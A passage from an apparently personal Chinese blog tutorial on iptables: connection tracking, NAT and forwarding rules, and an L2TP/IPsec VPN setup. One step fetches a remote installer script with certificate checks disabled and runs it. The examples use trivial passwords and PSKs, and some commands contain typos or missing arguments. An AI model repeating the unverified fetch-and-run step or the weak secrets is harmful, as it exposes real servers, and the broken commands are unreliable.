class="hljs-comment">##查看一键入职最大连接数nf_conntrack_max</span><br>sysctl -a |grep net.nf_conntrack_max<br>net.nf_conntrack_max = 262144<br><br><span class="hljs-comment">##配置net.nf_conntrack_max参数，调整linux的内核参数</span><br>vim /etc/sysctl.conf<br>net.nf_conntrack_max=100000<br>sysctl -p <span class="hljs-comment">##生效</span><br><br><span class="hljs-comment">##默认的系统配置内是有生效的</span><br>sysctl -a |grep net.nf_conntrack<br>net.nf_conntrack_max = 100000<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181116392-132789822.png" alt="image-20220730144147814"></p><h2 id="连接跟踪模块-系统参数-的开启，是有加载这个内核模块的，加载这个模块，最大连接数参数才能启动"><a href="#连接跟踪模块-系统参数-的开启，是有加载这个内核模块的，加载这个模块，最大连接数参数才能启动" class="headerlink" title="连接跟踪模块(系统参数)的开启，是有加载这个内核模块的，加载这个模块，最大连接数参数才能启动"></a>连接跟踪模块(系统参数)的开启，是有加载这个内核模块的，加载这个模块，最大连接数参数才能启动</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs none">lsmod | grep nf_conntrack<br>sysctl -a | grep nf_conntrack_max<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181116707-944456070.png" alt="image-20220730161940656"></p><p>解决方案：</p><p>1.调大nf_conntrack_max的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##配置net.nf_conntrack_max参数，调整linux的内核参数</span><br>vim /etc/sysctl.conf<br>net.nf_conntrack_max=100000<br>sysctl -p <span class="hljs-comment">##生效</span><br></code></pre></td></tr></table></figure><p>2.可设置tcp连接timeout超时时间，减少超时时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##查询</span><br>sysctl -a | grep netfilter.nf_conntrack_tcp<br><br>net.netfilter.nf_conntrack_tcp_timeout_established = 432000<br>net.netfilter.nf_conntrack_tcp_timeout_fin_wait = 120<br>net.netfilter.nf_conntrack_tcp_timeout_last_ack = 30<br>net.netfilter.nf_conntrack_tcp_timeout_max_retrans = 300<br></code></pre></td></tr></table></figure><h3 id="state模块应用"><a href="#state模块应用" class="headerlink" title="state模块应用"></a>state模块应用</h3><p>-m state分为：NEW，ESTABLISHED，RELATED，INVALID等state状态，最重点就是NEW和ESTABLISHED，<strong>新连接(新机器请求)和已经建立的连接(老机器SSH连接等，telnet连接等)</strong></p><p>1.128能访问129,129不能访问128</p><p>原理：拒绝所有来自10.0.0.129的新连接(新的tcp包)，128的出方向(output)没有限制，所以就是128能通129</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">iptables -I INPUT -s 10.0.0.129 -m state --state NEW -j REJECT<br></code></pre></td></tr></table></figure><p>2.允许已经建立连接的老机器访问state established</p><p>原理：已与本机建立连接的客户端，比如SSH连接，还可以连，其他的拒绝访问，可以插在默认的拒绝所有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">iptables -I INPUT -m state --state ESTABLISHED -j ACCEPT<br></code></pre></td></tr></table></figure><h1 id="TARGET：-j动作"><a href="#TARGET：-j动作" class="headerlink" title="TARGET：-j动作"></a>TARGET：-j动作</h1><p>TARGET主要模块有：ACCEPT，REJECT，DROP(丢包)，LOG(记录到日志中)</p><h1 id="iptables规则优化最佳实践"><a href="#iptables规则优化最佳实践" class="headerlink" title="iptables规则优化最佳实践"></a>iptables规则优化最佳实践</h1><p>主要是看主机在通过iptables所需要经过的过滤规则，如何配置性能更优</p><p>1.ESTABLISHED的连接，比如可以查看cat /proc/net/nf_conntrack查看已经建立连接的客户端，可以放在前面</p><p>2.入站新请求，-m state –state NEW，可以将其REJECT，谨慎放行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">iptables -A INPUT -m state --state NEW -s 10.20.0.0/24 -j REJECT<br></code></pre></td></tr></table></figure><p>3.默认所有都是拒绝，在拒绝的大段前面放行该放行的小段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##默认所有全部拒绝，写在最下面</span><br>iptables -A INPUT -j REJECT<br><br><span class="hljs-comment">##类似</span><br>iptables -I INPUT -p tcp -m multiport --dports 80,443,8080 -s 172.16.0.0/24 -d 10.0.0.0/24 -j ACCREPT<br></code></pre></td></tr></table></figure><p>4.访问同一类应用，比如http 80端口，拒绝10.0.0.0/24，允许10.0.0.129访问，129放大段前面，大段包含小段，优先找小段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs none">iptables -I INPUT -p tcp --dport 80 -s 10.0.0.129 -j ACCEPT<br>iptables -A INPUT -p tcp --dport 80 -s 10.0.0.0/24 -j REJECT<br></code></pre></td></tr></table></figure><p>5.不同类应用，mysql&amp;http，匹配大的放前面</p><p>6.匹配多个端口，多个地址，放一起</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs none">-p tcp -m multiport --dports 80,443,8001<br>-p tcp -m iprange --src-range 10.0.0.128-10.0.0.135<br></code></pre></td></tr></table></figure><p>7.配置类似公有云安全组的方式，默认拒绝所有，需要放行才加白</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">-s 10.0.0.0/24 -j REJECT<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181117072-1546640363.png" alt="image-20220731084029330"></p><h1 id="iptables规则的保存"><a href="#iptables规则的保存" class="headerlink" title="iptables规则的保存"></a>iptables规则的保存</h1><p>对于Cent OS 7及以上，将规则重定向到指定文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">iptables-save &gt; /iptables/rules<br></code></pre></td></tr></table></figure><p>如果误删除，可以使用，这个是标准输入交互，将文件内容输入进去即可，这个保存文件可以拷贝给其他主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs none">iptables-restore &lt; /iptables/rules<br>scp rules $host:/iptables/rules<br></code></pre></td></tr></table></figure><p>可以将这个写进开机自启动的脚本内，但是需要确保这个iptables/rules文件要在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs none">vim /etc/rc.local<br>##注意：rc.local必须chmod +x rc.local<br><br>##手动加载iptables规则<br>iptables-restore &lt; /iptables/rules<br></code></pre></td></tr></table></figure><p>安装service的方法</p><p>可以安装iptables.service的包，默认的iptables规则路径在/etc/sysconfig/iptables.service</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum -y install iptables.service<br>systemctl status iptables<br>systemctl status iptables.service<br>● iptables.service - IPv4 firewall with iptables<br>   Loaded: loaded (/usr/lib/systemd/system/iptables.service; enabled; vendor preset: disabled)<br>   Active: active (exited) since Sun 2022-07-31 08:35:18 CST; 47min ago<br> Main PID: 8674 (code=exited, status=0/SUCCESS)<br>   CGroup: /system.slice/iptables.service<br></code></pre></td></tr></table></figure><p>可以使用iptables-save将规则保存在文件中</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">Iptables-save &gt; /iptables/rules<br>开机自启动<br>systemctl enable --now iptables.service<br></code></pre></td></tr></table></figure><h1 id="iptables网络FORWARD配置"><a href="#iptables网络FORWARD配置" class="headerlink" title="iptables网络FORWARD配置"></a>iptables网络FORWARD配置</h1><p>实现：内访问外部主机，外部主机不能访问到内部</p><p><img src="2792175-20220828181117452-699103923.png" alt="image-20220731121904111"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##环境，不同网段，外网配置为仅主机模式</span><br>外网机器 172.16.0.128 Ubuntu<br>iptables机器 10.0.0.128(内网) 172.16.0.128/24(外网)<br>内网机器 10.0.0.129<br><br><span class="hljs-comment">##slave1安装http服务</span><br>systemctl <span class="hljs-built_in">enable</span> --now httpd<br><br><span class="hljs-comment">##ubuntu修改root密码，ubuntu主机默认是使用ubuntu用户登录，但是ubuntu默认是sudoers的权限</span><br>sudo passwd root<br>new password：123<br>su root<br></code></pre></td></tr></table></figure><p>目前测试：从内部10.0.0.129能联通172.16.0.128/24，外部进不来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##10.0.0.129 slave1配置：网卡网关指向iptables防火墙机器</span><br>vim /etc/sysconfig/network-scripts/ifcfg-ens33<br>GATEWAY=10.0.0.128<br>ping www.baidu.com是ok的，开启了ipv4转发forward<br><br><span class="hljs-built_in">cat</span> /etc/sysctl.conf | grep ipv4<br>net.ipv4.ip_forward=1<br></code></pre></td></tr></table></figure><p>实现转发FORWARD配置，实现内部curl外部机器，仅有外部机器这个IP能够访问内部</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##先拒绝所有，再放行</span><br>iptables -A FORWARD -j REJECT<br><br><span class="hljs-comment">##内部到外网新的包全部放通</span><br>iptables -I FORWARD -s 10.0.0.0/24 ！-d 10.0.0.0/24 -m state --state NEW -j ACCEPT<br><br><span class="hljs-comment">##仅允许转发到外部机器</span><br>iptables -I FORWARD -s 10.0.0.0/24 ！-d  -m state --state NEW -j ACCEPT<br><br><span class="hljs-comment">##所有网段FORWARD转发的包全部接收，状态为ESTABLISHED</span><br>iptables -I FORWARD -m state --state ESTABLISHED -j ACCEPT<br></code></pre></td></tr></table></figure><h1 id="iptables实现SNAT和DNAT"><a href="#iptables实现SNAT和DNAT" class="headerlink" title="iptables实现SNAT和DNAT"></a>iptables实现SNAT和DNAT</h1><p>SNAT：源地址转换，内网能够访问公网，哪边出</p><p>DNAT：目的地址转换，目的能够访问内网，NAT网关起到一个转发的作用，转发到目的IP的目的端口</p><p>一般在企业内部，SNAT用于内部机器上网，比如k8s集群内的node节点；外部访问一般使用SLB负载均衡或者是直接机器的公网IP解析到域名，通过SLB/机器的安全组规则进行流量的过滤</p><p>同一台机器的SNAT规则：根据业务端口的不同划分</p><p>不同机器相同业务的SNAT规则：根据IP地址的不同划分</p><p>SNAT：必须要配置内网地址，私网三类地址</p><p><img src="2792175-20220828181117815-1787667441.png" alt="image-20220731174427030"></p><p>NAT表的四个链：PRE-ROUTING，INPUT，OUTPUT，POST-ROUTING，需要在POST-ROUTING chain上面配置，向外的地址转换NAT</p><p><img src="2792175-20220828181118152-528216290.png" alt="image-20220731174652547"></p><p>从POST-ROUTING转发出去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##专线网络,to-source表示当前固定的公网IP</span><br>iptables -t nat -I POSTROUTING -s 10.0.0.0/24 ! -d 10.0.0.0/24 -j SNAT --to-source 100.9.6.4<br><br><span class="hljs-comment">##动态IP，查看NAT表的信息，除了10.0.0.0/24网段，其他全部转发，从POST_ROUTING出去</span><br>iptables -t nat -I POSTROUTING -s 10.0.0.0/24 ! -d 10.0.0.0/24 -j MASQUERADE<br>iptables -t nat -nL / iptables -t nat -nL --line-numbers<br>Chain POSTROUTING (policy ACCEPT)<br>target     prot opt <span class="hljs-built_in">source</span>               destination         <br>MASQUERADE  all  --  10.0.0.0/24         !10.0.0.0/24 <br><br><span class="hljs-comment">##删除NAT表的规则</span><br>iptables -t nat -D POSTROUTING(chain) 1<br><br><span class="hljs-comment">##配置iptables机器的双网卡，要和ubuntu主机同一个网段</span><br><span class="hljs-built_in">cp</span> ifcfg-ens33 ifcfg-ens36<br>IPADDR=172.16.0.10<br>NETMASK=255.255.255.0<br>GATEWAY=172.16.0.2<br><br><span class="hljs-comment">##在ubuntu上tail日志查看访问IP，获取到源端IP了；去掉POSTROUTING规则就无法curl通了，slave1的gateway是10.0.0.128，出口网关，所以在nginx日志中获取的是出口网关的IP</span><br>curl 172.16.0.135---&gt;nginx服务<br><span class="hljs-built_in">tail</span> -f /var/log/nginx/access.log<br>172.16.0.10 - - [01/Aug/2022:13:56:24 +0000] <span class="hljs-string">&quot;GET / HTTP/1.1&quot;</span> 200 612 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;curl/7.29.0&quot;</span><br><br><span class="hljs-comment">##curl一个大一点的文件，查看ubuntu端的tcp连接状态(ESTABLISHED)，ss -nt，peer查看远端的地址</span><br>State              Recv-Q           Send-Q           Local Address:Port          Peer   <br>ESTAB              0                1152608          172.16.0.135:80             172.16.0.10:53704<br>curl 172.16.0.135/test.txt<br></code></pre></td></tr></table></figure><h2 id="iptables实现DNAT-外访问内"><a href="#iptables实现DNAT-外访问内" class="headerlink" title="iptables实现DNAT(外访问内)"></a>iptables实现DNAT(外访问内)</h2><p>访问到iptables默认的出公网地址(NAT网关的IP)，由这个地址转发到内部的请求，访问内部的应用+端口号；DNAT规则就是默认的IP了，不会有动态IP的情况，一般的NAT网关/SLB的IP都为固定</p><p>从PREROUTING进去，目的IP为iptables的公网网卡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##源-s：源端IP，-d：网关的IP，--to-destination：interserver(内网目标机器的IP)</span><br>iptables -t nat -I PREROUTING -s 172.16.0.135 -d 172.16.0.10 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.130:8080<br><br><span class="hljs-comment">##直接DNAT可以</span><br><br><span class="hljs-comment">##查看</span><br>ipnum -t nat<br>Chain PREROUTING (policy ACCEPT)<br>num  target     prot opt <span class="hljs-built_in">source</span>               destination         <br>1    DNAT       tcp  --  172.16.0.135         172.16.0.10          tcp dpt:80 to:10.0.0.130:80<br><br><span class="hljs-comment">##测试，从ubuntu机器(172.16.0.135)访问，无论是curl还是telnet都是通的，证明DNAT成功</span><br><span class="hljs-comment">##目标端10.0.0.130的http服务修改了port为8080</span><br>curl 172.16.0.10<br>curl 172.16.0.10<br>http <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><h2 id="iptables实现重定向REDIRECT-有点问题，不如直接DNAT"><a href="#iptables实现重定向REDIRECT-有点问题，不如直接DNAT" class="headerlink" title="iptables实现重定向REDIRECT(有点问题，不如直接DNAT)"></a>iptables实现重定向REDIRECT(有点问题，不如直接DNAT)</h2><p>同样也是在PREROUTING上面写，通过NAT网关的IP:80转发到后端的8080端口，类似SLB的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##-d目的地址，--dport：NAT网关上面的地址，--to-ports：目标地址的业务端口，从80转发到8080</span><br>iptables -t nat -I PREROUTING  -s 172.16.0.135 -d 172.16.0.10 -p tcp --dport 80 -j REDIRECT --to-ports 8080<br><br><span class="hljs-comment">##重定向转发貌似不是很行</span><br><br><span class="hljs-comment">##测试，能否转发到8080端口</span><br>curl 172.16.0.10 80<br>telnet 172.16.0.10 80<br></code></pre></td></tr></table></figure><h1 id="综合案例"><a href="#综合案例" class="headerlink" title="综合案例"></a>综合案例</h1><p><img src="2792175-20220828181118478-1291676721.png" alt="image-20220803212953176"></p><h1 id="iptables实现VPN搭建-周末可以研究这个脚本"><a href="#iptables实现VPN搭建-周末可以研究这个脚本" class="headerlink" title="iptables实现VPN搭建(周末可以研究这个脚本)"></a>iptables实现VPN搭建(周末可以研究这个脚本)</h1><p><strong>Cent OS搭建l2tp</strong></p><p>方案一：通过获取现成L2PT脚本搭建</p><p>1、拉取脚本</p><p>wget –no-check-certificate <a href="https://raw.githubusercontent.com/teddysun/across/master/l2tp.sh">https://raw.githubusercontent.com/teddysun/across/master/l2tp.sh</a></p><p>2、更改权限</p><p>chmod +x l2tp.sh</p><p>3、跑脚本</p><p>./l2tp.sh</p><p>wget –no-check-certificate <a href="https://raw.githubusercontent.com/teddysun/across/master/l2tp.sh">https://raw.githubusercontent.com/teddysun/across/master/l2tp.sh</a></p><p>4、显示Please enter IP-Range</p><p>输入：10.0.10 .0 （表示分给客户端的IP段）</p><p>5、显示Please enter PSK</p><p>输入：123456 （自定义PSK，随便英文数字都可）</p><p>6、显示Please enter Username</p><p>输入：123456 （自定义用户名）</p><p>7、显示Please enter 123456’s password</p><p>输入：123456 （自定义密码）</p><p>8、后面一直enter即可，成功后会返回主要信息。</p><p>注意点：如果WIN10客户端连接不上，需要更改注册表</p><p>打开regedit</p><p>找到HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Rasman\Parameters</p><p>新建 Value Name: ProhibitIpSec</p><p> Data Type: REG_DWORD</p><p> Value: 1</p><p>备注：</p><p>如果你要想对用户进行操作，可以使用如下命令：</p><p>l2tp -a 新增用户</p><p>l2tp -d 删除用户</p><p>l2tp -m 修改现有的用户的密码</p><p>l2tp -l 列出所有用户名和密码</p><p>l2tp -h 列出帮助信息</p><p>其他事项：</p><p>1、脚本在安装完成后，已自动启动进程，并加入了开机自启动。</p><p>2、脚本会改写 iptables 或 firewalld 的规则。</p><p>3、脚本安装时，会即时将安装日志写到 /root/l2tp.log 文件里，如果你安装失败，可以通过此文件来寻找错误信息。</p><p>使用命令：</p><p>ipsec status （查看 IPSec 运行状态）</p><p>ipsec verify （查看 IPSec 检查结果）</p><p>/etc/init.d/ipsec start|stop|restart|status （CentOS6 下使用）</p><p>/etc/init.d/xl2tpd start|stop|restart （CentOS6 下使用）</p><p>systemctl start|stop|restart|status ipsec （CentOS7 下使用）</p><p>systemctl start|stop|restart xl2tpd （CentOS7 下使用）</p><p>service ipsec start|stop|restart|status （Debian/Ubuntu 下使用）</p><p>service xl2tpd start|stop|restart （Debian/Ubuntu 下使用）</p><p>方案二：自建L2PT</p><p>1.安装 l2tp ipsec 所需要的软件包</p><p>yum install epel-release</p><p>yum install openswan xl2tpd ppp lsof</p><p>2.设置ipsec</p><p>2.1 编辑 /etc/ipsec.conf</p><p>vi /etc/ipsec.conf</p><p>把下面xx.xxx.xxx.xxx换成你自己主机实际的外网固定IP。其他的不动。</p><p>config setup</p><p>protostack=netkey</p><p>dumpdir=/var/run/pluto/</p><p>nat_traversal=yes</p><p>virtual_private=%v4:10.0.0.0/8,%v4:192.168.0.0/16,%v4:172.16.0.0/12,%v4:25.0.0.0/8,%v4:100.64.0.0/10,%v6:fd00::/8,%v6:fe80::/10</p><p>conn L2TP-PSK-NAT</p><p>rightsubnet=vhost:%priv</p><p>also=L2TP-PSK-noNAT</p><p>conn L2TP-PSK-noNAT</p><p>authby=secret</p><p>pfs=no</p><p>auto=add</p><p>keyingtries=3</p><p>dpddelay=30</p><p>dpdtimeout=120</p><p>dpdaction=clear</p><p>rekey=no</p><p>ikelifetime=8h</p><p>keylife=1h</p><p>type=transport</p><p>left=xxx.xxx.xxx.xxx</p><p>leftprotoport=17/1701</p><p>right=%any</p><p>rightprotoport=17/%any</p><p>2.2 编辑/etc/ipsec.secrets</p><p>vi /etc/ipsec.secrets</p><p>include /etc/ipsec.d/default.secrets</p><p>/etc/ipsec.secrets 文件里面默认有一句包含</p><p>/etc/ipsec.d/*.secrets</p><p>的语句.所以可以直接在 /etc/ipsec.d 目录下新建一自己的个 default.secrets 文件.也可以直接把它注释掉,添加下面的配置语句.</p><p>vi /etc/ipsec.d/my.secrets</p><p>xxx.xxx.xxx.xxx %any: PSK “kuaile”</p><p>xx.xxx.xxx.xxx换成你自己VPS实际的外网固定IP, YourPsk你自己定一个，到时候连VPN的时候用，比如可以填csdn.net, 注意空格。</p><p>2.3 修改/添加 /etc/sysctl.conf</p><p>vi /etc/sysctl.conf</p><p>确保下面的字段都有，对应的值或下面一样。省事的话直接在/etc/sysctl.conf的末尾直接把下面内容的粘过去。</p><p>net.ipv4.ip_forward = 1</p><p>net.ipv4.conf.default.accept_redirects = 0</p><p>net.ipv4.conf.default.send_redirects = 0</p><p>net.ipv4.conf.eth0.rp_filter = 0</p><p>net.ipv4.conf.default.rp_filter = 0</p><p>2.4 让修改后的sysctl.conf生效</p><p>sysctl -p</p><p>2.5 验证ipsec运行状态</p><p>ipsec setup start</p><p>ipsec verify</p><p>verify的内容如下所示，那么就离成功不远了。没有 红色 的fail 就可以了.</p><p>Verifying installed system and configuration files</p><p>Version check and ipsec on-path [OK]</p><p>Libreswan 3.15 (netkey) on 3.10.0-123.9.3.el7.x86_64</p><p>Checking for IPsec support in kernel [OK]</p><p>NETKEY: Testing XFRM related proc values</p><p> ICMP default/send_redirects [OK]</p><p> ICMP default/accept_redirects [OK]</p><p> XFRM larval drop [OK]</p><p>Pluto ipsec.conf syntax [OK]</p><p>Hardware random device [N/A]</p><p>Two or more interfaces found, checking IP forwarding [OK]</p><p>Checking rp_filter [OK]</p><p>Checking that pluto is running [OK]</p><p>Pluto listening for IKE on udp 500 [OK]</p><p>Pluto listening for IKE/NAT-T on udp 4500 [OK]</p><p>Pluto ipsec.secret syntax [OK]</p><p>Checking ‘ip’ command [OK]</p><p>Checking ‘iptables’ command [OK]</p><p>Checking ‘prelink’ command does not interfere with FIPSChecking for obsolete ipsec.conf options [OK]</p><p>Opportunistic Encryption [DISABLED]</p><p>\3. 设置 l2tp</p><p>3.1 编辑 /etc/xl2tpd/xl2tpd.conf</p><p>vim /etc/xl2tpd/xl2tpd.conf</p><p>[global]</p><p>ipsec saref = yes</p><p>listen-addr = xxx.xxx.xxx.xxx ;这里是你的主机外网ip地址,;号是注释,和一般的配置文件不同</p><p>; Use refinfo of 22 if using an SAref kernel patch based on openswan 2.6.35 or</p><p>; when using any of the SAref kernel patches for kernels up to 2.6.35.</p><p>; saref refinfo = 30</p><p>;</p><p>force userspace = yes</p><p>;</p><p>; debug tunnel = yes</p><p>[lns default]</p><p>ip range = 10.0.10.2-10.0.10.100 ;这里是VPN client的内网ip地址范围</p><p>local ip = 10.0.10.1 ;这里是VPN server的内网地址</p><p>refuse chap = yes</p><p>refuse pap = yes</p><p>require authentication = yes</p><p>name = LinuxVPNserver</p><p>ppp debug = yes</p><p>pppoptfile = /etc/ppp/options.xl2tpd</p><p>length bit = yes</p><p>3.2 编辑 /etc/ppp/options.xl2tpd</p><p>vi /etc/ppp/options.xl2tpd</p><p>name l2tpd</p><p>require-mschap-v2</p><p>ms-dns 180.76.76.76</p><p>ms-dns 223.5.5.5</p><p>ms-dns 8.8.8.8</p><p>ipcp-accept-local</p><p>ipcp-accept-remote</p><p>#ms-dns 8.8.8.8</p><p>noccp</p><p>auth</p><p>crtscts</p><p>idle 1800</p><p>mtu 1410</p><p>mru 1410</p><p>nodefaultroute</p><p>debug</p><p>lock</p><p>proxyarp</p><p>connect-delay 5000</p><p>3.3 配置用户名,密码:编辑 /etc/ppp/chap-secrets</p><p>vim /etc/ppp/chap-secrets</p><p>client和secret自己填，server和IP留号，l2tp 可以用上面自己设定的 l2tpd . 通用</p><p># Secrets for authentication using CHAP</p><p># client server secret IP addresses</p><p>ison * 123456 *</p><p>3.4 启动xl2tp</p><p>service xl2tpd start</p><p>\4. 开放端口以及转发</p><p>原样执行下面所有命令</p><p>/sbin/iptables -A INPUT -p udp -m policy –dir in –pol ipsec -m udp –dport 1701 -j ACCEPT</p><p>/sbin/iptables -A INPUT -p udp -m udp –dport 1701 -j ACCEPT</p><p>/sbin/iptables -A INPUT -p udp -m udp –dport 500 -j ACCEPT</p><p>/sbin/iptables -A INPUT -p udp -m udp –dport 4500 -j ACCEPT</p><p>/sbin/iptables -A INPUT -p esp -j ACCEPT</p><p>/sbin/iptables -A INPUT -m policy –dir in –pol ipsec -j ACCEPT</p><p>/sbin/iptables -A FORWARD -d 10.0.10.0/24 -j ACCEPT</p><p>/sbin/iptables -A FORWARD -s 10.0.10.0/24 -j ACCEPT</p><p>/sbin/iptables -A FORWARD -i ppp+ -m state –state NEW,RELATED,ESTABLISHED -j ACCEPT</p><p>/sbin/iptables -A FORWARD -m state –state RELATED,ESTABLISHED -j ACCEPT</p><p>/sbin/iptables -t nat -A POSTROUTING -s 10.0.10.0/24 -o eth0 -j MASQUERADE</p><p>再执行下面保存iptables</p><p>service iptables save</p><p>service iptables restart</p><p>添加开机自启动</p><p>systemd enabled ipsec</p><p>systemd enabled xl2tpd</p><p>如果连接不上的话, 先关掉iptalbes试试 service iptables stop</p><p>如果这时还连不上了，那么就是iptables的问题了</p><p>特别注意iptables里的顺序， INPUT和FORWARD里的REJECT一定是写在最后面，否则写在他们之后的port就都被REJECT了！</p><p>下面是我自己的iptables，可供参考</p><p>#############</p><p>*nat</p><p>:PREROUTING ACCEPT [3:160]</p><p>:INPUT ACCEPT [3:160]</p><p>:OUTPUT ACCEPT [3:180]</p><p>:POSTROUTING ACCEPT [3:180]</p><p>-A POSTROUTING -s 10.0.10.0/24 -o eth0 -j MASQUERADE</p><p>COMMIT</p><p># Completed on Sat Mar 18 22:21:34 2017</p><p># Generated by iptables-save v1.4.21 on Sat Mar 18 22:21:34 2017</p><p>*filter</p><p>:INPUT ACCEPT [237:33515]</p><p>:FORWARD ACCEPT [0:0]</p><p>:OUTPUT ACCEPT [162:45870]</p><p>-A INPUT -m state –state ESTABLISHED,RELATED -j ACCEPT</p><p>-A INPUT -p icmp -j ACCEPT</p><p>-A INPUT -i lo -j ACCEPT</p><p>-A INPUT -m state –state NEW -m tcp -p tcp –dport 80 -j ACCEPT</p><p>-A INPUT -m state –state NEW -m tcp -p tcp –dport 443 -j ACCEPT</p><p>-A INPUT -m state –state NEW -m tcp -p tcp –dport 22 -j ACCEPT</p><p>-A INPUT -p udp -m policy –dir in –pol ipsec -m udp –dport 1701 -j ACCEPT</p><p>-A INPUT -p udp -m udp –dport 1701 -j ACCEPT</p><p>-A INPUT -p udp -m udp –dport 500 -j ACCEPT</p><p>-A INPUT -p udp -m udp –dport 4500 -j ACCEPT</p><p>-A INPUT -p esp -j ACCEPT</p><p>-A INPUT -m policy –dir in –pol ipsec -j ACCEPT</p><p>-A FORWARD -d 10.0.10.0/24 -j ACCEPT</p><p>-A FORWARD -s 10.0.10.0/24 -j ACCEPT</p><p>-A FORWARD -i ppp+ -m state –state NEW,RELATED,ESTABLISHED -j ACCEPT</p><p>-A FORWARD -m state –state RELATED,ESTABLISHED -j ACCEPT</p><p>-A INPUT -j REJECT –reject-with icmp-host-prohibited</p><p>-A FORWARD -j REJECT –reject-with icmp-host-prohibited</p><p>COMMIT</p><p># Completed on Sat Mar 18 22:21:34 2017</p><h1 id="firewalld防火墙工具"><a href="#firewalld防火墙工具" class="headerlink" title="firewalld防火墙工具"></a>firewalld防火墙工具</h1><p>分为命令行工具和图形化工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 